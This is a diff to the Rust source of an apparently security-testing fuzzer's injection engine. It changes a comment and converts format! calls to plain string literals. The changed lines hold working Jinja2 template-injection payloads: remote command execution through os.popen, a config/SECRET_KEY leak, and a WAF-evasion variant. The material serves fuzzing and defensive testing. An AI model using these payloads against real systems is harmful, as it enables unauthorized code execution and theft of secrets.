@@ -18,7 +18,7 @@ use std::fmt;
 ///
 /// The engine generates payloads tagged with injection class, payload
 /// variant, and expected oracle signal so the fuzzer can detect success.
-
+///
 /// Injection class supported by the engine.
 #[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
 pub enum InjectionClass {
@@ -236,7 +236,7 @@ impl InjectionEngine {
 
         match engine {
             TemplateEngine::Jinja2 => vec![
-                make_ssti(engine, "rce-import", &format!("{{{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}}}"), OracleSignal::ReflectedValue("uid=".into())),
+                make_ssti(engine, "rce-import", "{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}", OracleSignal::ReflectedValue("uid=".into())),
                 make_ssti(engine, "config-leak", "{{config.items()}}", OracleSignal::ReflectedValue("SECRET_KEY".into())),
                 make_ssti(engine, "mro-walk", "{{''.__class__.__mro__[2].__subclasses__()}}", OracleSignal::BodyLengthDelta),
                 make_ssti(engine, "math-confirm", &format!("{{{{{}*{}}}}}", a, b), OracleSignal::MathResult(result_str.clone())),
@@ -588,7 +588,7 @@ impl InjectionEngine {
         if self.config.max_evasion_level >= 1 {
             payloads.push(make_payload(
                 InjectionClass::Ssti, "evasion-jinja-attr",
-                &format!("{{{{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fbuiltins\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fimport\\x5f\\x5f')('os')|attr('popen')('id')|attr('read')()}}}}"),
+                "{{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fbuiltins\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fimport\\x5f\\x5f')('os')|attr('popen')('id')|attr('read')()}}",
                 OracleSignal::ReflectedValue("uid=".into()),
                 "Jinja2 WAF evasion via attr()", 1,
             ));
